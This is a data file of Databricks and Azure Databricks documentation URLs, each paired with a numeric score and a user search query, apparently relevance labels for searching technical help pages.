+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/string,string split sql
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/parameters/timezone,invalid timezone
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-datatype-rules,is incompatible with nvarchar encrypted
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-datatypes,data types
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-null-semantics,databricksexceptions$sqlexecutionexception: java.sql.sqlexception: unsupported type null
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-partition,drop partition
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-syntax-aux-conf-mgmt-set-timezone,time zone
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-syntax-aux-show-columns,filter  columns in a table show columns (databricks sql)
+6,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-syntax-ddl-create-sql-function,spark sql function
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-syntax-ddl-create-table,azure sql create table azure databricks sql
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-syntax-ddl-create-view,temporary view
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-syntax-dml-insert-into,com.microsoft.sqlserver.jdbc.sqlserverexception: operand type clash: varchar
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/sql-ref-syntax-qry-select-values,values clause (databricks sql)
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/release-notes/,sql endpoint
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/user/,databricks sql user guide favorites and tags
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/user/alerts/,modify alert
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/user/dashboards/,databricks sql dashboard
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/user/data/,azure data explorer
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/user/queries/query-filters,query filters
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/user/queries/query-parameters,widgets panel
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/user/queries/query-snippets,query snippets
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/user/security/,is incompatible with nvarchar encrypted
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/user/security/access-control/dashboard-acl,elk dashboard
+3,https://docs.microsoft.com/en-us/azure/databricks/sql/user/security/access-control/data-acl,data access control api
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/user/security/access-control/sql-endpoint-acl,sql endpoint access control sql endpoint
+3,https://docs.microsoft.com/en-us/azure/databricks/sql/user/security/personal-access-tokens,personal access tokens
+5,https://docs.microsoft.com/en-us/azure/databricks/sql/user/visualizations/tables,replace table is only supported with v2 tables.
+1,https://docs.microsoft.com/en-us/azure/databricks/tutorials/run-jobs-with-service-principals,2204200040005851  not able to use service principal to create databricks azure key vault-backed secret scope
+0,https://docs.microsoft.com/en-us/azure/databricks/workspace/,navigate file storage upgrade workspace navigate the workspace navigate to apps
+0,https://docs.microsoft.com/en-us/azure/databricks/workspace/workspace-details,prod jobs are delayed due to issue in static cluster instance name per-workspace url job error invalid template
+0,https://docs.microsoft.com/en-us/azure/databricks/workspace/workspace-objects,trash folder
+6,https://kb.databricks.com/en_US/bi/configure-simba-proxy-windows,simba odbc spark
+0,https://kb.databricks.com/en_US/cloud/redshift-connection-fails,intermittent redshift connection issue from job clusters
+0,https://kb.databricks.com/en_US/cloud/unable-load-aws-credentials,unable to load aws credentials
+0,https://kb.databricks.com/en_US/clusters/cluster-failed-launch,could not launch cluster due to cloud provider failures. cloud provider launch failure cloud provider launch failure cluster terminated. reason: cloud provider launch failure
+0,https://kb.databricks.com/en_US/clusters/edited-policy-not-applied,cannot apply updated cluster policy
+0,https://kb.databricks.com/en_US/clusters/s3-failed-no-roles-available,how to specify a role in the notebook.
+0,https://kb.databricks.com/en_US/clusters/set-instance-profile-arn-optional-policy,how to check existing cluster
+1,https://kb.databricks.com/en_US/clusters/termination-reasons,databricks help center  contact us unexpected cluster termination databricks initiated request limit exceeded cloud provider initiated terminations on demand single node cluster terminated. reason: azure resource provider throttling
+0,https://kb.databricks.com/en_US/data-sources/access-blobstore-odbc,azure data lake database driver
+0,https://kb.databricks.com/en_US/data-sources/create-table-json-serde,cannot read hive tables with serde properties
+1,https://kb.databricks.com/en_US/data/list-delete-files-faster,how to list and delete files faster in databricks delete file
+0,https://kb.databricks.com/en_US/dbfs/dbfs-s3-bucket-costs,dbfs size
+2,https://kb.databricks.com/en_US/delta/backfill-delta-table-cols,update column is not empty but it's not  delta table
+3,https://kb.databricks.com/en_US/dev-tools/use-tcpdump-create-pcap-files,"""invalid access token"""
+0,https://kb.databricks.com/en_US/execution/maximum-execution-context,maximum field length
+6,https://kb.databricks.com/en_US/execution/serialized-task-is-too-large,total size of serialized results of 601 tasks (4.0 gib) is bigger than spark.driver.maxresultsize 4.0 gib
+0,https://kb.databricks.com/en_US/jobs/job-fails-no-library,fail to install python library glpk fail to install python library glpk installed library
+0,https://kb.databricks.com/en_US/jobs/job-rate-limit,rate limiting
+0,https://kb.databricks.com/en_US/libraries/library-fail-dependency-exception,fail to install python library glpk
+0,https://kb.databricks.com/en_US/libraries/pystan-fails-dbr64es,dbr 10.4
+0,https://kb.databricks.com/en_US/machine-learning/mlflow-artifacts-download,download azure
+6,https://kb.databricks.com/en_US/metrics/explore-spark-metrics,spark listener
+6,https://kb.databricks.com/en_US/metrics/spark-metrics,spark listener
+3,https://kb.databricks.com/en_US/notebooks/access-s3-temp-session-token,using credentials to access s3 bucket
+0,https://kb.databricks.com/en_US/notebooks/common-errors-in-notebooks,job failed with oom
+0,https://kb.databricks.com/en_US/notebooks/display-not-show-microseconds,display() does not show microseconds correctly
+0,https://kb.databricks.com/en_US/python/dbfs-file-size-limit,dbfs size
+0,https://kb.databricks.com/en_US/python/import-custom-ca-cert,how to import a custom ca certificate
+0,https://kb.databricks.com/en_US/sql/error-download-full-results,a retriable error occurred while attempting to download a result file from the cloud store but the retry limit had been exceeded download results to excel
+0,https://kb.databricks.com/en_US/streaming/job-kinesis-connector-fail-oom,"""gc overhead limit exceeded"""
+2,https://kb.databricks.com/en_US/visualizations/save-plotly-to-dbfs,how to upload a file from delta to default path
